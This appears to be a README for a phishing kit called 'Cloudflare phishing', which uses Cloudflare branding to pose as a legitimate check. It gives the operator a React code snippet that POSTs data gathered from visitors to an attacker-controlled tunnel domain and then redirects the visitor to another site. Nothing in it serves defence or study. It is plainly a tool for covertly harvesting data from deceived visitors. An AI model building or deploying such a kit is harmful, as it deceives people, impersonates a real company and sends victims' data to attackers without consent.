# Cloudflare phishing
## That's useful thing for gathering meta-datas by using redirect in other sites.
---
### CHANGES
- In directory Frontend, exists file App.tsx, you have to change below:
```js
// Redirect
setTimeout(() => {
      window.location.href = "http://<DOMAIN FOR REDIRECT>";
    }, 1000);

// Your tunnel
const response = await fetch(
      "http://<DOMAIN YOUR TUNNEL>",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );

```
![Cloudflare](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Faetoswire.com%2Fstorage%2Fclients%2Fclient-6590%2Fcloudflare-logo.png&f=1&nofb=1&ipt=f3aa7db60d7aff2b18233ec9b7657ca42488796ee5df52b2116aadb56b27bc3e)
